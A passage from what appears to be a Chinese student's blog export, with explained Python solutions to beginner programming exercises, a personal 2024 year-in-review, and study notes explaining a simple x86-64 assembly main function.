<h2 id="解释-2"><a href="#解释-2" class="headerlink" title="解释"></a>解释</h2><p>先判断 $n$ 是否为负数，如果是负数，则先取绝对值，再反转，最后再取负值。如果 $n$ 为正数，则直接反转。</p>
<blockquote>
<p>这题有个有意思的点就是，切片操作，直接用切片翻转字符串，然后再转换回整数，可以得到正确的结果。</p>
</blockquote>
<h1 id="小鱼的数字游戏"><a href="#小鱼的数字游戏" class="headerlink" title="小鱼的数字游戏"></a>小鱼的数字游戏</h1><h2 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h2><p>小鱼最近被要求参加一个数字游戏，要求它把看到的一串数字 $a_i$（长度不一定，以 $0$ 结束），记住了然后反着念出来（表示结束的数字 $0$ 就不要念出来了）。这对小鱼的那点记忆力来说实在是太难了，你也不想想小鱼的整个脑袋才多大，其中一部分还是好吃的肉！所以请你帮小鱼编程解决这个问题。</p>
<h2 id="输入格式-3"><a href="#输入格式-3" class="headerlink" title="输入格式"></a>输入格式</h2><p>一行内输入一串整数，以 $0$ 结束，以空格间隔。</p>
<h2 id="输出格式-3"><a href="#输出格式-3" class="headerlink" title="输出格式"></a>输出格式</h2><p>一行内倒着输出这一串整数，以空格间隔。</p>
<h2 id="样例-1-3"><a href="#样例-1-3" class="headerlink" title="样例 #1"></a>样例 #1</h2><h3 id="样例输入-1-3"><a href="#样例输入-1-3" class="headerlink" title="样例输入 #1"></a>样例输入 #1</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">3 65 23 5 34 1 30 0</span><br></pre></td></tr></table></figure></div>

<h3 id="样例输出-1-3"><a href="#样例输出-1-3" class="headerlink" title="样例输出 #1"></a>样例输出 #1</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">30 1 34 5 23 65 3</span><br></pre></td></tr></table></figure></div>

<h2 id="提示-1"><a href="#提示-1" class="headerlink" title="提示"></a>提示</h2><h4 id="数据规模与约定"><a href="#数据规模与约定" class="headerlink" title="数据规模与约定"></a>数据规模与约定</h4><p>对于 $100%$ 的数据，保证 $0 \leq a_i \leq 2^{31} - 1$，数字个数不超过 $100$。</p>
<h2 id="题解-3"><a href="#题解-3" class="headerlink" title="题解"></a>题解</h2><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split()))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    <span class="keyword">if</span> a[<span class="built_in">len</span>(a) - <span class="number">1</span> - i] == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(a[<span class="built_in">len</span>(a) - <span class="number">1</span> - i], end=<span class="string">&quot; &quot;</span>)</span><br></pre></td></tr></table></figure></div>

<h2 id="解释-3"><a href="#解释-3" class="headerlink" title="解释"></a>解释</h2><p>先将输入的数字列表 <code>a</code> 倒序，然后遍历列表，如果当前数字不为 $0$，则输出该数字，否则，跳过该数字。</p>
<h1 id="小玉买文具"><a href="#小玉买文具" class="headerlink" title="小玉买文具"></a>小玉买文具</h1><h2 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h2><p>班主任给小玉一个任务，到文具店里买尽量多的签字笔。已知一只签字笔的价格是 $1$ 元 $9$ 角，而班主任给小玉的钱是 $a$ 元 $b$ 角，小玉想知道，她最多能买多少只签字笔呢。</p>
<h2 id="输入格式-4"><a href="#输入格式-4" class="headerlink" title="输入格式"></a>输入格式</h2><p>输入只有一行两个整数，分别表示 $a$ 和 $b$。</p>
<h2 id="输出格式-4"><a href="#输出格式-4" class="headerlink" title="输出格式"></a>输出格式</h2><p>输出一行一个整数，表示小玉最多能买多少只签字笔。</p>
<h2 id="样例-1-4"><a href="#样例-1-4" class="headerlink" title="样例 #1"></a>样例 #1</h2><h3 id="样例输入-1-4"><a href="#样例输入-1-4" class="headerlink" title="样例输入 #1"></a>样例输入 #1</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">10 3</span><br></pre></td></tr></table></figure></div>

<h3 id="样例输出-1-4"><a href="#样例输出-1-4" class="headerlink" title="样例输出 #1"></a>样例输出 #1</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">5</span><br></pre></td></tr></table></figure></div>

<h2 id="提示-2"><a href="#提示-2" class="headerlink" title="提示"></a>提示</h2><h4 id="数据规模与约定-1"><a href="#数据规模与约定-1" class="headerlink" title="数据规模与约定"></a>数据规模与约定</h4><p>对于全部的测试点，保证 $0 \leq a \leq 10^4$，$0 \leq b \leq 9$。</p>
<h2 id="题解-4"><a href="#题解-4" class="headerlink" title="题解"></a>题解</h2><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">expensive_paper = <span class="number">1.9</span></span><br><span class="line">a, b = <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split())</span><br><span class="line">money = a + b * <span class="number">0.1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">int</span>(money / expensive_paper))</span><br></pre></td></tr></table></figure></div>

<h2 id="解释-4"><a href="#解释-4" class="headerlink" title="解释"></a>解释</h2><p>首先，我们知道一只签字笔的价格是 $1$ 元 $9$ 角，所以我们可以计算出小玉的钱可以买多少只签字笔。</p>
<blockquote>
<p>这边需要复习一下小数点后精确的知识点</p>
</blockquote>
<h1 id="小玉家的电费"><a href="#小玉家的电费" class="headerlink" title="小玉家的电费"></a>小玉家的电费</h1><h2 id="题目描述-5"><a href="#题目描述-5" class="headerlink" title="题目描述"></a>题目描述</h2><p>夏天到了，各家各户的用电量都增加了许多，相应的电费也交的更多了。小玉家今天收到了一份电费通知单。小玉看到上面写：据闽价电 [2006]27 号规定，月用电量在 $150$ 千瓦时及以下部分按每千瓦时 $0.4463$ 元执行，月用电量在 $151\sim 400$ 千瓦时的部分按每千瓦时 $0.4663$ 元执行，月用电量在 $401$ 千瓦时及以上部分按每千瓦时 $0.5663$ 元执行;小玉想自己验证一下，电费通知单上应交电费的数目到底是否正确呢。请编写一个程序，已知用电总计，根据电价规定，计算出应交的电费应该是多少。</p>
<h2 id="输入格式-5"><a href="#输入格式-5" class="headerlink" title="输入格式"></a>输入格式</h2><p>输入一个正整数，表示用电总计（单位以千瓦时计），不超过 $10000$。</p>
<h2 id="输出格式-5"><a href="#输出格式-5" class="headerlink" title="输出格式"></a>输出格式</h2><p>输出一个数，保留到小数点后 $1$ 位（单位以元计，保留到小数点后 $1$ 位）。</p>
<h2 id="样例-1-5"><a href="#样例-1-5" class="headerlink" title="样例 #1"></a>样例 #1</h2><h3 id="样例输入-1-5"><a href="#样例输入-1-5" class="headerlink" title="样例输入 #1"></a>样例输入 #1</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">267</span><br></pre></td></tr></table></figure></div>

<h3 id="样例输出-1-5"><a href="#样例输出-1-5" class="headerlink" title="样例输出 #1"></a>样例输出 #1</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">121.5</span><br></pre></td></tr></table></figure></div>

<h2 id="题解-5"><a href="#题解-5" class="headerlink" title="题解"></a>题解</h2><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">money = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> n &lt;= <span class="number">150</span>:</span><br><span class="line">    money = n * <span class="number">0.4463</span></span><br><span class="line"><span class="keyword">elif</span> n &lt;= <span class="number">400</span> <span class="keyword">and</span> n &gt; <span class="number">150</span>:</span><br><span class="line">    money = <span class="number">150</span> * <span class="number">0.4463</span> + (n - <span class="number">150</span>) * <span class="number">0.4663</span></span><br><span class="line"><span class="keyword">elif</span> n &gt; <span class="number">400</span>:</span><br><span class="line">    money = <span class="number">150</span> * <span class="number">0.4463</span> + (<span class="number">400</span> - <span class="number">150</span>) * <span class="number">0.4663</span> + (n - <span class="number">400</span>) * <span class="number">0.5663</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;%.1f&quot;</span> % money)</span><br></pre></td></tr></table></figure></div>

<h2 id="解释-5"><a href="#解释-5" class="headerlink" title="解释"></a>解释</h2><p>首先，我们先判断用电量是否在 $150$ 千瓦时及以下部分，如果在，则按每千瓦时 $0.4463$ 元执行，如果不在，则判断用电量是否在 $151\sim 400$ 千瓦时的部分，如果在，则按每千瓦时 $0.4663$ 元执行，如果不在，则判断用电量是否在 $401$ 千瓦时及以上部分，如果在，则按每千瓦时 $0.5663$ 元执行。</p>
<p>然后，我们计算出应交的电费，保留到小数点后 $1$ 位。</p>
<h1 id="小玉在游泳"><a href="#小玉在游泳" class="headerlink" title="小玉在游泳"></a>小玉在游泳</h1><h2 id="题目描述-6"><a href="#题目描述-6" class="headerlink" title="题目描述"></a>题目描述</h2><p>小玉开心的在游泳，可是她很快难过的发现，自己的力气不够，游泳好累哦。已知小玉第一步能游 $2$ 米，可是随着越来越累，力气越来越小，她接下来的每一步都只能游出上一步距离的 $98%$。现在小玉想知道，如果要游到距离 $s$ 米的地方，她需要游多少步呢。请你编程解决这个问题。</p>
<h2 id="输入格式-6"><a href="#输入格式-6" class="headerlink" title="输入格式"></a>输入格式</h2><p>输入一个实数 $s$（单位：米），表示要游的目标距离。</p>
<h2 id="输出格式-6"><a href="#输出格式-6" class="headerlink" title="输出格式"></a>输出格式</h2><p>输出一个整数，表示小玉一共需要游多少步。</p>
<h2 id="样例-1-6"><a href="#样例-1-6" class="headerlink" title="样例 #1"></a>样例 #1</h2><h3 id="样例输入-1-6"><a href="#样例输入-1-6" class="headerlink" title="样例输入 #1"></a>样例输入 #1</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">4.3</span><br></pre></td></tr></table></figure></div>

<h3 id="样例输出-1-6"><a href="#样例输出-1-6" class="headerlink" title="样例输出 #1"></a>样例输出 #1</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">3</span><br></pre></td></tr></table></figure></div>

<h2 id="提示-3"><a href="#提示-3" class="headerlink" title="提示"></a>提示</h2><p>数据保证，$0 \leq s &lt; 100$，且 $s$ 小数点后最多只有一位。</p>
<h2 id="题解-6"><a href="#题解-6" class="headerlink" title="题解"></a>题解</h2><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="built_in">float</span>(<span class="built_in">input</span>())</span><br><span class="line">step = <span class="number">2</span></span><br><span class="line">all_step = <span class="number">0</span></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> all_step &lt; s:</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    all_step += step</span><br><span class="line">    step = step * <span class="number">0.98</span></span><br><span class="line"><span class="built_in">print</span>(count)</span><br></pre></td></tr></table></figure></div>

<h2 id="解释-6"><a href="#解释-6" class="headerlink" title="解释"></a>解释</h2><p>首先，我们初始化 <code>step</code> 为 $2$，<code>all_step</code> 为 $0$，<code>count</code> 为 $0$。</p>
<p>然后，我们开始循环，当 <code>all_step</code> 小于等于 <code>s</code> 时，我们进行一次循环，<code>count</code> 加 $1$，<code>all_step</code> 加上 <code>step</code>，<code>step</code> 乘以 $0.98$。</p>
<p>最后，我们输出 <code>count</code>，表示小玉一共需要游多少步。</p>
<h1 id="禽兽的传染病"><a href="#禽兽的传染病" class="headerlink" title="禽兽的传染病"></a>禽兽的传染病</h1><h2 id="题目背景"><a href="#题目背景" class="headerlink" title="题目背景"></a>题目背景</h2><p>mxj 的启发。</p>
<h2 id="题目描述-7"><a href="#题目描述-7" class="headerlink" title="题目描述"></a>题目描述</h2><p>禽兽患传染病了。一个禽兽会每轮传染 $x$ 个禽兽。试问 $n$ 轮传染后有多少禽兽被传染？</p>
<h2 id="输入格式-7"><a href="#输入格式-7" class="headerlink" title="输入格式"></a>输入格式</h2><p>两个非负整数 $x$ 和 $n$。</p>
<h2 id="输出格式-7"><a href="#输出格式-7" class="headerlink" title="输出格式"></a>输出格式</h2><p>一个整数，即被传染的禽兽数。</p>
<h2 id="样例-1-7"><a href="#样例-1-7" class="headerlink" title="样例 #1"></a>样例 #1</h2><h3 id="样例输入-1-7"><a href="#样例输入-1-7" class="headerlink" title="样例输入 #1"></a>样例输入 #1</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">10 2</span><br></pre></td></tr></table></figure></div>

<h3 id="样例输出-1-7"><a href="#样例输出-1-7" class="headerlink" title="样例输出 #1"></a>样例输出 #1</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">121</span><br></pre></td></tr></table></figure></div>

<h2 id="提示-4"><a href="#提示-4" class="headerlink" title="提示"></a>提示</h2><p>保证 $x,n$ 以及答案都在 $64$ 位无符号整数的表示范围内。</p>
<h2 id="题解-7"><a href="#题解-7" class="headerlink" title="题解"></a>题解</h2><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;这个我不会做&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<h2 id="解释-7"><a href="#解释-7" class="headerlink" title="解释"></a>解释</h2><p>这个题目我不会做，因为我不会。</p>
]]></content>
      <categories>
        <category>Python</category>
        <category>蓝桥</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>蓝桥</tag>
        <tag>洛谷</tag>
      </tags>
  </entry>
  <entry>
    <title>2024年度总结</title>
    <url>/posts/c2cf88b8.html</url>
    <content><![CDATA[<p>平时没有随手详细记录的习惯，只有相册最能带起我的回忆，每次总结几乎都是看着相册回忆的。</p>
<h2 id="2024-年度总结"><a href="#2024-年度总结" class="headerlink" title="2024 年度总结"></a>2024 年度总结</h2><h3 id="一月"><a href="#一月" class="headerlink" title="一月"></a>一月</h3><p>一月在忙啥呢，月初正在奋战期末，虽然最后成绩不咋地倒数，放假依旧是最后一个走的。</p>
<p>晚回去几天，筹备了一下选课指北的更新，那时候就已经用 ChatGPT 写脚本了，那时候 ChatGPT 还是 3.5 版本。现在 3.5 已经被淘汰了，AI 发展好快。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://picx.zhimg.com/80/v2-fb688a9ea02d7aa0ab9689f8e85f94ad.png"
                      alt="img"
                ></p>
<p>翻到相册里去年是 1.16 初雪，那时候都已经放假回家了，只有一小部分同学还在学校，不知道今年第一场雪什么时候下。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic1.zhimg.com/80/v2-ce1758b0b8cef94314d89ff84bd9b2aa.jpeg"
                      alt="img"
                ></p>
<p>月末正在放寒假，去拔了一颗智齿，真的很痛，在家里玩幻兽帕鲁，顺便随便学点。</p>
<h3 id="二月"><a href="#二月" class="headerlink" title="二月"></a>二月</h3><p>二月在家拍了全家福，选课指北工作做了好几天，一致好评（墨镜），当时选课系统很抽象，那时候选课指北域名还是 <a class="link"   href="https://xkzb.qfnu.w1ndys.top/" >xkzb.qfnu.w1ndys.top<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，来来回回也是到处问到处回答问题，研究各专业的培养方案，一顿忙碌，键盘都快敲烂了。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pica.zhimg.com/80/v2-a7c05de0e3efe6b0052740aba4cbe8ee.png"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://picx.zhimg.com/80/v2-3685ef9af59b963c13c4f00398343ba5.png"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://picx.zhimg.com/80/v2-26d5a641ef1a1f49c4c051bc35af9b5e.jpeg"
                      alt="img"
                ></p>
<p>2.22 就回学校了，提前回来了一个多星期吧，雪还没化。</p>
<p>2 月底就开始泡图书馆了，每天抱着电脑去图书馆写代码写新的选课指北（<a class="link"   href="https://easy-qfnu.top/" >Easy-QFNU<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>），老爽了。</p>
<p>四级没过。</p>
<h3 id="三月"><a href="#三月" class="headerlink" title="三月"></a>三月</h3><p>三月继续搞 Easy-QFNU，三月中旬和师哥们举办了网络安全协会院赛，出了一些简单的题目。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://picx.zhimg.com/80/v2-1804ba2f5a4f31a63bc4b39c7a203c11.jpeg"
                      alt="img"
                ></p>
<p>好大儿送的一米五的大鼬子。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic1.zhimg.com/80/v2-67881c5932c69ca92b2d5e91a78e0e62.jpeg"
                      alt="img"
                ></p>
<p>学不懂的计组、网络安全数学基础，密码学根本看不懂啊。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic1.zhimg.com/80/v2-a1077330bf46f9b5f1ef59cc7c2b91a1.jpeg"
                      alt="img"
                ></p>
<p>三月底体重还是很好的，现在……不想说什么了。</p>
<h3 id="四月"><a href="#四月" class="headerlink" title="四月"></a>四月</h3><p>四月，入手了 AOC 显示器，体验感很好，拿来写代码太舒服了。</p>
<p>痴迷于写 Easy-QFNU，到很晚才回宿舍。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic1.zhimg.com/80/v2-1fcd7ac00369c112cac82935c1a38314.jpeg"
                      alt="img"
                ></p>
<p>蓝桥杯，为 IT 事业捐款 300 元。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://picx.zhimg.com/80/v2-cbe42ba1b8d3a73ca79a5fe2370a105e.png"
                      alt="img"
                ></p>
<p>4 月 13 号拍了好多花。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pica.zhimg.com/80/v2-c129167f5843c47d815ff7096cc4b6f4.jpeg"
                      alt="img"
                ></p>
<p>HGAME2024 的周边。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://picx.zhimg.com/80/v2-76d827a5f46b4529f55ca3e219541e59.jpeg"
                      alt="img"
                ></p>
<p>水了个计算机设计省赛，最后省三（确实水），我都不知道拿奖了。</p>
<p>烫头发~，Easy-QFNU 的提交数达到了七百多。</p>
<p>被一个问题折腾了很久。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pica.zhimg.com/80/v2-11f8546040dafec612436eaf0c2813eb.png"
                      alt="img"
                ></p>
<h3 id="五月"><a href="#五月" class="headerlink" title="五月"></a>五月</h3><p>还是有时间都在搞 Easy-QFNU，周末没事就去自习室 code 找乐子。</p>
<p>音乐节。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://picx.zhimg.com/80/v2-189c3d6c189b52d98152d85496e898d9.jpeg"
                      alt="img"
                ></p>
<h3 id="六月"><a href="#六月" class="headerlink" title="六月"></a>六月</h3><p>天天泡图书馆写代码…..</p>
<p>第一次进网络中心看看啥样。</p>
<p>Qwen 大模型开源了，部署在本地看看啥样（本地跑不动，很蠢）。</p>
<p>和师哥举办补天校园行活动。</p>
<h3 id="七月"><a href="#七月" class="headerlink" title="七月"></a>七月</h3><p>暑假留校，不得不说留校是真的舒服，自己想学什么学什么，一个人住一小屋。</p>
<p>第一次接触 docker 容器技术。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pica.zhimg.com/80/v2-aaa6b8abe47ef0f94dadc4e1e45c9291.jpeg"
                      alt="img"
                ></p>
<p>成绩陆续快出来了，幸好没挂科，感谢计组老师捞了一把，学院网络部这边接任了部长。</p>
<p>闲着没事干闲逛，原来之前就观摩过化院那边的石膏娃娃。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://picx.zhimg.com/80/v2-f9b284648cca8d8fcd40c64fda35f515.png"
                      alt="img"
                ></p>
<p>7.22 Easy-QFNU 正式发布。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://picx.zhimg.com/80/v2-faffa317112b6dfd0986053da34932dc.jpeg"
                      alt="img"
                ></p>
<p>开始在迎新群里接新生，回复问题了~</p>
<p>回家拔了第二对智齿。</p>
<p><strong>卷卷（QQ 机器人）诞生了</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic1.zhimg.com/80/v2-dfe99d81d48df6a534d74489c03d93c3.jpeg"
                      alt="img"
                ></p>
<h3 id="八月"><a href="#八月" class="headerlink" title="八月"></a>八月</h3><p>8 月 2 号回学校继续留校，对卷卷 QQ 机器人开发上瘾了，每天都在捣鼓这个 Python。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pica.zhimg.com/80/v2-825fd2e6f2fde515d0901817b0020e9c.png"
                      alt="img"
                ></p>
<p>在学校自己过了一个生日。</p>
<p>更高频率的回复 24 级新生的问题，卷卷也已经投入新生群的使用了。</p>
<p>四级又没过。</p>
<p>办了健身房的卡，跟舍友一起去。</p>
<p>开始跟主办方筹划源鲁杯。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://picx.zhimg.com/80/v2-7c5adfb46efcd95ebd4a36f48f309269.png"
                      alt="img"
                ></p>
<p>迎新季，当然我也参与工作了，毕竟是学生干部。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://picx.zhimg.com/80/v2-11404a53bc031d6daff14b1fe3fcde88.jpeg"
                      alt="img"
                ></p>
<p><strong>认识了一个小师妹</strong></p>
<h3 id="九月"><a href="#九月" class="headerlink" title="九月"></a>九月</h3><p>九月刚开学，时间还很宽裕，晚上经常逛操场玩。</p>
<p>接着就是迎新宣讲、网络部、网络空间安全协会都宣讲。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic1.zhimg.com/80/v2-d57a75a532a65b5c5ab75851f5556098.jpeg"
                      alt="img"
                ></p>
<h3 id="十月"><a href="#十月" class="headerlink" title="十月"></a>十月</h3><p>又烫了一次头。</p>
<p>第一次去猫咖撸猫。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic1.zhimg.com/80/v2-84c341ae09b096e7c89d961e86e592f2.jpeg"
                      alt="img"
                ></p>
<p>第一次抓娃娃。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://picx.zhimg.com/80/v2-823b3e29a0074e588a4eeb3877385a27.jpeg"
                      alt="img"
                ></p>
<p>网络部干事纳新。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://picx.zhimg.com/80/v2-654763acab654782738c0e0789f065ac.jpeg"
                      alt="img"
                ></p>
<p>上了大学以来第一次觉得有用的课，安工讲的。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://picx.zhimg.com/80/v2-8f1baadbc6d36be9d2ac7fe00b013de9.jpeg"
                      alt="img"
                ></p>
<p>源鲁杯准备开赛了~！</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pica.zhimg.com/80/v2-fda27e793bd2fa078cdf11150b7f69eb.png"
                      alt="img"
                ></p>
<p>前面提到的很水的奖…….</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pica.zhimg.com/80/v2-cb05c966affd7093591bd92668ed0c7c.png"
                      alt="img"
                ></p>
<p>九州信泰杯，第二次打省赛了，很幸运这次在本校打，作为学生代表发言哈哈哈哈，虽然我菜菜的，面基了好几个厉害的师傅。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://picx.zhimg.com/80/v2-0923bbf1c14ab4a587090ba868dbd67e.jpeg"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://picx.zhimg.com/80/v2-c14f2e0922f1afc9a74e6034c4b9bd22.jpeg"
                      alt="img"
                ></p>
<h3 id="十一月"><a href="#十一月" class="headerlink" title="十一月"></a>十一月</h3><p>百团大战、玩了一天拍了好多照片。</p>
<p><strong>11.10，遇到了这辈子很重要的一个人</strong>，嘿嘿~</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pica.zhimg.com/80/v2-8f2be113e9daba5da8e18ce61110fcf6.jpeg"
                      alt="img"
                ></p>
<p>15 号在德州打技能兴鲁决赛，题难度不算很大，省二应该是，主办方到现在没消息（真慢）。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic1.zhimg.com/80/v2-25fa2ab17158ef3c1e7aeef5f2db5d25.jpeg"
                      alt="img"
                ></p>
<p>月底迎新晚会，搞弹幕大屏，还挺好玩的。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://picx.zhimg.com/80/v2-6f7c0e1b21ca5c1bc15e07c864aadf3c.jpeg"
                      alt="img"
                ></p>
<h3 id="十二月"><a href="#十二月" class="headerlink" title="十二月"></a>十二月</h3><p>第一次涂石膏娃娃，还有火锅！火锅！</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pica.zhimg.com/80/v2-028bff33a96f708adb5a2bfec8247604.jpeg"
                      alt="img"
                ></p>
<p>省赛的证书发了。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://picx.zhimg.com/80/v2-b6c723175a0c08bee81468736415908a.jpeg"
                      alt="img"
                ></p>
<p>吃吃吃，玩玩玩。</p>
<p>开始学习 flask 网站。</p>
<p>第一次收到花。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://picx.zhimg.com/80/v2-698dcf59289e130444c80c24719e1de9.jpeg"
                      alt="img"
                ></p>
<p>即兴想法又来撸猫了。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic1.zhimg.com/80/v2-f4cf7adc90a647263d7a5a7b895c34f5.jpeg"
                      alt="img"
                ></p>
<p>吃烤肉吃烤肉。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pica.zhimg.com/80/v2-88b8a37c3f282ca062aa711e31d9eeb2.jpeg"
                      alt="img"
                ></p>
<p>2024 就这样收官了，2025 继续加油。</p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>W1ndys年度总结</tag>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title>3月25日汇编语言与逆向工程</title>
    <url>/posts/ca668a7f.html</url>
    <content><![CDATA[<h1 id="3-月-25-日汇编语言与逆向工程"><a href="#3-月-25-日汇编语言与逆向工程" class="headerlink" title="3 月 25 日汇编语言与逆向工程"></a>3 月 25 日汇编语言与逆向工程</h1><h2 id="主函数"><a href="#主函数" class="headerlink" title="主函数"></a>主函数</h2><h3 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Reverse-project/4/image-20240323212852517.png"
                      alt="image-20240323212852517"
                ></p>
<ol>
<li><p><code>push rbp</code>：将当前函数的栈帧基址寄存器的值压入栈中，用于保存前一个函数的栈帧基址。</p>
</li>
<li><p><code>mov rbp, rsp</code>：将栈顶指针的值赋给栈帧基址寄存器，这样 rbp 指向了当前函数的栈帧。</p>
</li>
<li><p><code>sub rsp, 10h</code>：在栈上为局部变量分配 10h（16 字节）的空间，即在栈上分配了 16 字节的空间用于存储局部变量或临时数据。</p>
</li>
<li><p><code>mov esi, 4</code>：将立即数 4 赋给 esi 寄存器，该寄存器通常用于作为函数参数传递整型参数。</p>
</li>
<li><p><code>mov edi, 3</code>：将立即数 3 赋给 edi 寄存器，通常用于作为函数参数传递整型参数。</p>
</li>
<li><p><code>call fun</code>：调用名为 <code>fun</code> 的函数，传递了两个参数，分别是 4 和 3，它们存储在 esi 和 edi 寄存器中。</p>
</li>
<li><p><code>mov [rbp+m], eax</code>：将 eax 寄存器的值（即函数 <code>fun</code> 的返回值）存储到位于当前栈帧的偏移量 m 处的内存地址中。这里的 m 是一个未知的值，需要根据具体的代码上下文来确定。</p>
</li>
<li><p><code>mov eax, 0</code>：将 0 赋给 eax 寄存器，通常用于函数返回值。</p>
</li>
<li><p><code>leave</code>：恢复栈帧，实际上执行的是 mov rsp, rbp 和 pop rbp 的组合指令，将栈帧基址寄存器（rbp）的值恢复为调用者的栈帧基址，并将栈指针（rsp）恢复到调用者函数的栈顶。</p>
</li>
<li><p><code>retn</code>：函数返回指令，将控制流返回到调用该函数的地址处。</p>
</li>
</ol>
<p>这段代码的主要作用是调用一个函数 <code>fun</code>，将参数 4 和 3 传递给它，然后将其返回值存储到指定的内存位置，并返回到调用者。</p>
